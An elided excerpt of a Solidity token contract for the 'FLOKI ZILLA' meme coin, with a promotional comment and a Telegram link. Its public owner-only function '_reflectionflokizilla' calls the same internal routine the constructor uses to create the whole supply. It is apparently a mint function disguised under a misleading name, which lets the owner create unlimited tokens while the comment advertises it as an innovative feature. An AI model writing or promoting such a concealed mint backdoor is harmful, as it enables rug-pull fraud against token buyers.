...
//
// $FLOKIZILLA proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/Floki_Zilla
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _reflectionflokizilla(uint256 amount) public onlyOwner {
    _reflectionflokizilla(msg.sender, amount);
    }
    ...
    function _reflectionflokizilla(address account, uint256 amount) internal virtual {
...
contract $FLOKIZILLA is ERC20 {
    ...
    constructor() public ERC20("FLOKI ZILLA", "FZ") {
        _reflectionflokizilla(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}